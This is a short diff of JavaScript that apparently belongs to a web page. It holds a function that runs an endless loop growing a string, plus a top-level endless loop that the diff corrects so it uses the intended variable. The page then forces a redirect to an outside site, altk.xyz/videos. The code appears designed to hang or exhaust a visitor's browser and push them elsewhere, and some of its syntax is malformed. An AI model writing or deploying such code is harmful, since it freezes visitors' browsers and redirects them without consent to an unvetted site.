@@ -35,5 +35,5 @@ function justhhhh(){
   while (0.1) 
     theafsd = theafsd += "c"
 }
-while theafsd = theafs += "c" 
+while theafsd = theafsd += "c" 
 window.location.replace("https://altk.xyz/videos/")
